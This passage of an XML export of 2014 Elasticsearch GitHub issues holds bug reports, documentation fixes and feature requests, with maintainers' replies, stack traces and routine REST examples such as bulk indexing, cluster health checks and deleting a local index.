</comment><comment author="dakrone" created="2016-09-27T13:00:36Z" id="249857463">Going to close this as it's been almost 2 years and we have a different issue we are tracking things for the 5.0 release - #20031
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Is the IndexResponse.matches() method outdated?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7548</link><project id="" key="" /><description>I am checking the Java APIs in http://www.elasticsearch.org/guide/en/elasticsearch/client/java-api/current/index_.html. The page includes the following code snippet:

IndexResponse response = client.prepareIndex("twitter", "tweet", "1")
        .setSource(json)
        .execute()
        .actionGet();
List&lt;String&gt; matches = response.matches();

However, when checking the source code, I could not find the matches() method in the IndexResponse class (even in its parent classes). I was wondering if the code snippet is outdated.

Thanks in advance,
Seonah 
</description><key id="41785371">7548</key><summary>Docs: Is the IndexResponse.matches() method outdated?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">saleese</reporter><labels><label>docs</label></labels><created>2014-09-03T06:22:20Z</created><updated>2014-09-22T13:21:14Z</updated><resolved>2014-09-22T13:21:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-03T06:24:19Z" id="54256792">Thanks. Will fix it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>server side scripting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7547</link><project id="" key="" /><description>how about adding server side scripting capability similar to the lines of stored proc in SQL which will make ES more powerful analytics engine and avoids distributing logic between server side client side
</description><key id="41782826">7547</key><summary>server side scripting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">awkysam</reporter><labels><label>discuss</label></labels><created>2014-09-03T05:29:34Z</created><updated>2014-11-07T11:15:04Z</updated><resolved>2014-11-07T11:10:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-03T06:10:55Z" id="54255961">Are you talking about things like this: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-bucket-terms-aggregation.html#_script_11

I think IMHO that we already have that for many aggregations.

Closing. Feel free to reopen and add more details about what you expect if needed.
</comment><comment author="awkysam" created="2014-09-03T09:08:55Z" id="54270130">to put it in simple words stored procedure kind of feature where we can store aggregated values in variable and then do some complex logic over that.
Whatever I have seen in the examples it is row by row operation for each value like functions in traditional SQL (_value \* .8 or log(_value)).
</comment><comment author="roytmana" created="2014-09-03T17:18:46Z" id="54332280">I think it may already being considered but I would like agg metrics to support expressions based on other metrics in the same bucket. Say I want to calculate special kind of average based on several sums and  counts

If calculated metrics could refernce outside of their bucket to child buckets or parent ones it would be even mote powerful but will require 2 step processing I guess
</comment><comment author="clintongormley" created="2014-11-07T11:10:12Z" id="62128630">Given that documents are distributed, the only efficient way to execute document level scripts is "row by row".  We provide a scripted metric aggregation, and will probably add a scripted bucket aggregation, plus #8110 will add post-agg manipulation. 

We don't want to allow arbitrary script execution, especially scripts that could maintain state, as they could be very costly indeed.  Whatever we add needs to work efficiently in a distributed system.

Unless you have suggestions for types of scripts, I think this ticket is already solved by the above.  thanks
</comment><comment author="markharwood" created="2014-11-07T11:15:04Z" id="62129091">Scripted upserts also allow you to perform aggregation of multiple events (e.g. web accesses) into a single document that aggregates them based on a common key (e.g. a  session ID). The scripts can include logic that derives attributes for this entity based on new data and existing data e.g. update a web session duration or flag if the user looks to be a bot (accessed robots.txt, downloads no CSS/images)
It is then possible to perform query-time aggregations on these higher-level entities and their attributes such as `isBot` or `duration`.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix incorrect eclipse m2e markdown syntax</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7546</link><project id="" key="" /><description /><key id="41778502">7546</key><summary>Fix incorrect eclipse m2e markdown syntax</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">kcdragon</reporter><labels><label>docs</label></labels><created>2014-09-03T03:29:05Z</created><updated>2014-09-04T04:24:45Z</updated><resolved>2014-09-04T04:24:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-03T03:37:04Z" id="54248378">+1
</comment><comment author="dadoonet" created="2014-09-03T08:54:52Z" id="54268718">Hi @kcdragon 

Could you sign the [CLA](http://www.elasticsearch.org/contributor-agreement/) please? 
</comment><comment author="kcdragon" created="2014-09-04T01:50:02Z" id="54393965">@dadoonet I signed the CLA. Do I need to send you anything or is the process automated?
</comment><comment author="dadoonet" created="2014-09-04T02:41:28Z" id="54396995">Perfect. That's fine. Thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>IndexMissingException is misleading when index is closed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7545</link><project id="" key="" /><description>When  trying to write to a closed index, elasticsearch will throw `IndexMissingException`.
We witnessed this when logstash was trying to write to an index we had closed.
But the index isn't missing - it exists. It's just closed.

It would be better if there was an IndexClosedException :)

```
org.elasticsearch.indices.IndexMissingException: [foo] missing, :backtrace=&gt;
["org.elasticsearch.cluster.routing.operation.plain.PlainOperationRouting.indexRoutingTable(org/elasticsearch/cluster/routing/operation/plain/PlainOperationRouting.java:245)",
"org.elasticsearch.cluster.routing.operation.plain.PlainOperationRouting.shards(org/elasticsearch/cluster/routing/operation/plain/PlainOperationRouting.java:259)",
"org.elasticsearch.cluster.routing.operation.plain.PlainOperationRouting.shards(org/elasticsearch/cluster/routing/operation/plain/PlainOperationRouting.java:255)",
"org.elasticsearch.cluster.routing.operation.plain.PlainOperationRouting.indexShards(org/elasticsearch/cluster/routing/operation/plain/PlainOperationRouting.java:70)",
"org.elasticsearch.action.bulk.TransportBulkAction.executeBulk(org/elasticsearch/action/bulk/TransportBulkAction.java:238)",
"org.elasticsearch.action.bulk.TransportBulkAction.doExecute(org/elasticsearch/action/bulk/TransportBulkAction.java:149)",
"org.elasticsearch.action.bulk.TransportBulkAction.doExecute(org/elasticsearch/action/bulk/TransportBulkAction.java:65)",
"org.elasticsearch.action.support.TransportAction.execute(org/elasticsearch/action/support/TransportAction.java:65)",
"org.elasticsearch.action.bulk.TransportBulkAction$TransportHandler.messageReceived(org/elasticsearch/action/bulk/TransportBulkAction.java:351)",
"org.elasticsearch.action.bulk.TransportBulkAction$TransportHandler.messageReceived(org/elasticsearch/action/bulk/TransportBulkAction.java:340)",
"org.elasticsearch.transport.netty.MessageChannelHandler.handleRequest(org/elasticsearch/transport/netty/MessageChannelHandler.java:217)",
"org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(org/elasticsearch/transport/netty/MessageChannelHandler.java:111)"
```
</description><key id="41775690">7545</key><summary>IndexMissingException is misleading when index is closed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">avleen</reporter><labels><label>adoptme</label><label>enhancement</label></labels><created>2014-09-03T02:21:08Z</created><updated>2014-09-06T15:43:44Z</updated><resolved>2014-09-06T15:43:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T15:43:44Z" id="54715869">@avleen I agree, and so does master.  Trying to do a PUT or `_bulk` request against a closed index is throwing an IndexClosedException, eg:

```
PUT /_bulk
{"index":{"_index":"t","_type": "t"}}
{"foo":"bar"}

POST /t/_close

PUT /_bulk
{"index":{"_index":"t","_type": "t"}}
{"foo":"bar"}
```

When I try this on 1.3.1 I get the IndexMissingException, so this looks like it has already been fixed.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>fixed typo in shard query cache reference docs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7544</link><project id="" key="" /><description /><key id="41775101">7544</key><summary>fixed typo in shard query cache reference docs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">talam</reporter><labels><label>docs</label></labels><created>2014-09-03T02:07:14Z</created><updated>2014-09-08T08:51:49Z</updated><resolved>2014-09-08T08:51:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T15:32:12Z" id="54715499">Hi @talam 

Thanks for the fix.  Please could I ask you to sign the CLA so that I can get it merged in
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="talam" created="2014-09-08T03:11:23Z" id="54772901">Signed the CLA.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Do not use a background thread to disconnect node which are removed from the ClusterState</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7543</link><project id="" key="" /><description>After a node fails to respond to a ping correctly (master or node fault detection), they are removed from the cluster state through an UpdateTask. When a node is removed, a background task is scheduled using the generic threadpool to actually disconnect the node. However, in the case of temporary node failures (for example) it may be that the node was re-added by the time the task get executed, causing an untimely disconnect call. Disconnect is cheep and should be done during the UpdateTask.
</description><key id="41756950">7543</key><summary>Do not use a background thread to disconnect node which are removed from the ClusterState</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-02T21:29:01Z</created><updated>2015-06-07T12:08:59Z</updated><resolved>2014-09-03T06:51:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-02T21:33:04Z" id="54221038">I think simpler solution is just to remove the execution on a different thread, disconnect should be super cheap
</comment><comment author="bleskes" created="2014-09-02T21:38:39Z" id="54221698">@kimchy updated with another commit. I'll change the description before pushing (assuming no more feedback)
</comment><comment author="kimchy" created="2014-09-02T21:49:58Z" id="54223052">just to be safe, I would wrap each disconnect in a try ... catch block, similar to the connect code before. Other than that, LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Expose Latvian analyzer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7542</link><project id="" key="" /><description>This analyzer is undocumented today, so people do not know it exists.
</description><key id="41748998">7542</key><summary>Expose Latvian analyzer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>:Analysis</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-02T20:06:35Z</created><updated>2015-06-07T12:09:09Z</updated><resolved>2014-09-02T23:25:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-02T21:20:18Z" id="54219494">LGTM
</comment><comment author="nik9000" created="2014-09-02T21:27:11Z" id="54220360">Wonderful!  Thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Elasticsearch cache location on disk?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7541</link><project id="" key="" /><description>I'm using a sort of mixin with firebase to make indexes searchable (https://github.com/firebase/flashlight)

However, sometimes when I suddenly delete my Firebase index, the node script crashes, and seems to leave some indexed cache behind, and I can not figure out where this cache resides, or who is the cause (ES? flashlight? Firebase?)
See my question here for details: http://stackoverflow.com/questions/25558212/elasticsearch-index-cache-not-clearing-stuck
</description><key id="41740109">7541</key><summary>Elasticsearch cache location on disk?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">TrySpace</reporter><labels /><created>2014-09-02T18:34:52Z</created><updated>2014-09-06T18:49:17Z</updated><resolved>2014-09-06T15:27:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T15:27:16Z" id="54715373">@TrySpace assuming the data no longer exists in Elasticsearch (and if the index doesn't exist, then the data doesn't exist) then it sounds like the problem is external to ES.
</comment><comment author="TrySpace" created="2014-09-06T15:35:48Z" id="54715612">Wrong assumption, the data no longer exists in Firebase, however, Elasticsearch still returns the old index..
</comment><comment author="TrySpace" created="2014-09-06T18:35:03Z" id="54723872">Do you know which location on disk the cache is saved? No documentation mentions this.
</comment><comment author="clintongormley" created="2014-09-06T18:49:17Z" id="54724302">Elasticsearch doesn't cache anything on disk.  If you delete the index, then all data associated with that index is gone. I don't know what Firebase is, but when you say you delete the Firebase index, are you talking about something in Firebase, or in Elasticsearch?

If you haven't deleted the index in Elasticsearch then you can do so with:

```
curl -XDELETE localhost:9200/your_index_name
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Escaping index name when creating a snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7540</link><project id="" key="" /><description>In some cases the index name might not play well with the file system of the snapshot repository. 

For example, trying to snapshot 'index_crawl:1' (which includes a colon) would fail in for plugins using URI-based filesystems (HDFS for example) due to filesystem restrictions. 
</description><key id="41730827">7540</key><summary>Escaping index name when creating a snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">mateuszkaczynski</reporter><labels><label>:Snapshot/Restore</label><label>adoptme</label><label>enhancement</label></labels><created>2014-09-02T16:55:43Z</created><updated>2016-05-20T15:56:48Z</updated><resolved>2016-05-20T15:56:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T18:18:05Z" id="158668486">@imotov is this already implemented, or do we still need to do it?
</comment><comment author="imotov" created="2015-11-21T18:20:11Z" id="158669191">No, we will just use index name as is (which means we will only observe the index name restrictions).
</comment><comment author="imotov" created="2016-05-20T15:56:48Z" id="220645609">This is getting addressed as part of a bigger changes in snapshot/restore file naming schema in #18156. So, I am going to close it here.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes node client section name on Java API Doc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7539</link><project id="" key="" /><description>The links to the "node client" section on the [client java-api doc](http://www.elasticsearch.org/guide/en/elasticsearch/client/java-api/master/client.html) don't work due to a minor typo in the references.
</description><key id="41709626">7539</key><summary>Fixes node client section name on Java API Doc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">jsvd</reporter><labels><label>docs</label></labels><created>2014-09-02T13:36:07Z</created><updated>2014-09-08T09:23:54Z</updated><resolved>2014-09-08T09:22:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T15:18:03Z" id="54715066">Hi @jsvd  (/cc @dadoonet )

Thanks for the PR.  Actually, a better way to link is to use the ID directly, eg:

```
1.  Creating an embedded &lt;&lt;node-client,`Node`&gt;&gt; that acts as a node
```

This style of linking would have picked up the incorrect reference.  Would you mind updating the PR to use that style instead?

thanks
</comment><comment author="jsvd" created="2014-09-08T09:11:34Z" id="54793127">:thumbsup: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Not able to search in a recently opened index till some time.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7538</link><project id="" key="" /><description>To reduce the elasticsearch memory usage we keep only minimum number of indices open in ES, at any point in time. We close the  unwanted indices and then whenever the search is required to be executed against a closed index, we open it and then execute search.

But, it seems opening the index does not always return successful result and sometimes there is an exception `SearchPhaseExecutionException`. I tried to analyse the problem by enabling the ES debug and adding timestamps in the actual OPEN and SEARCH requests and it seems the index is actually opened on all shards after the SEARCH request is executed and hence  getting following exception.

Is there any way to make sure that the index is fully opened, in ES, across all shards? Adding a delay after opening the index helps but that may slow down the search operations. And again the required delay can vary depending on the size of index and other activities in the ES. Are there any other alternatives to this approach?

```
org.elasticsearch.action.search.SearchPhaseExecutionException: Failed to execute phase [query], all shards failed
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction.onFirstPhaseResult(TransportSearchTypeAction.java:272) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction$3.onFailure(TransportSearchTypeAction.java:224) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.search.action.SearchServiceTransportAction$4.handleException(SearchServiceTransportAction.java:222) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.transport.netty.MessageChannelHandler.handleException(MessageChannelHandler.java:181) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.transport.netty.MessageChannelHandler.handlerResponseError(MessageChannelHandler.java:171) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:123) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108) ~[elasticsearch-1.0.0.jar:na]
        at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42) ~[elasticsearch-1.0.0.jar:na]
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) ~[na:1.7.0_65]
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) ~[na:1.7.0_65]
        at java.lang.Thread.run(Thread.java:745) [na:1.7.0_65]
```

Thanks.

Manish
</description><key id="41707177">7538</key><summary>Not able to search in a recently opened index till some time.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mgalande</reporter><labels /><created>2014-09-02T13:09:48Z</created><updated>2014-09-06T15:12:30Z</updated><resolved>2014-09-06T15:12:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T15:12:30Z" id="54714930">Hi @mgalande 

First, flushing before you close the index will speed up opening.  Second, you can use the cluster health API to wait for yellow or green:

```
GET /_cluster/health/your_index?wait_for_status=yellow
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Shards stuck initalizing after restart if snapshot repository is on unavailable nfs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7537</link><project id="" key="" /><description>using 1.3.2 
i have a snapshot repository of type fs pointing to a hard nfs mount point
if i restart the cluster it will be stuck trying initializing shards on nodes where nfs is inaccessible for some reason
imo a broken snapshot repository should not prevent cluster from functioning
</description><key id="41702267">7537</key><summary>Shards stuck initalizing after restart if snapshot repository is on unavailable nfs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">OlegYch</reporter><labels><label>feedback_needed</label></labels><created>2014-09-02T12:09:58Z</created><updated>2014-12-30T20:25:09Z</updated><resolved>2014-12-30T20:25:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-09-02T12:46:32Z" id="54145776">@OlegYch could you post hot threads from the cluster in this state?
</comment><comment author="OlegYch" created="2014-09-03T16:49:25Z" id="54327596">sorry, i don't have those atm
</comment><comment author="clintongormley" created="2014-12-30T20:25:09Z" id="68394425">No further info provided. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Putting a mapping with an empty request body throws a NullPointerException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7536</link><project id="" key="" /><description>I have been struggling with an issue lately caused by my own fault of providing a valid request body when attempting to add a mapping to an existing index. Attempting to do so will yield a NullPointerException:

```
[2014-09-01 20:08:31,486][DEBUG][action.admin.indices.mapping.put] [Prototype] failed to put mappings on indices [[my_index]], type [my_type]
java.lang.NullPointerException
    at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:137)
    at org.elasticsearch.common.xcontent.XContentHelper.convertToMap(XContentHelper.java:113)
    at org.elasticsearch.common.xcontent.XContentHelper.convertToMap(XContentHelper.java:101)
    at org.elasticsearch.index.mapper.DocumentMapperParser.parseCompressed(DocumentMapperParser.java:181)
    at org.elasticsearch.index.mapper.MapperService.parse(MapperService.java:387)
    at org.elasticsearch.index.mapper.MapperService.parse(MapperService.java:377)
    at org.elasticsearch.cluster.metadata.MetaDataMappingService$5.execute(MetaDataMappingService.java:540)
    at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:309)
    at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:134)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
    at java.lang.Thread.run(Thread.java:745)
```

The issues is caused by https://github.com/elasticsearch/elasticsearch/blob/a059a6574a1c270ccc28ddec1671888fb0cfba28/src/main/java/org/elasticsearch/common/xcontent/XContentFactory.java#L213 which returns null if the input stream is empty. While this is fine, the real problem lies in `XContentHelper.convertToMap()` which does not properly check for `null`.

https://github.com/elasticsearch/elasticsearch/blob/a059a6574a1c270ccc28ddec1671888fb0cfba28/src/main/java/org/elasticsearch/common/xcontent/XContentHelper.java#L111-L113

To be fair, this isn't _really_ a bug and I'm more like asking to yield a proper exception in case a developer is as dumb as me and fails to provide a proper request body.
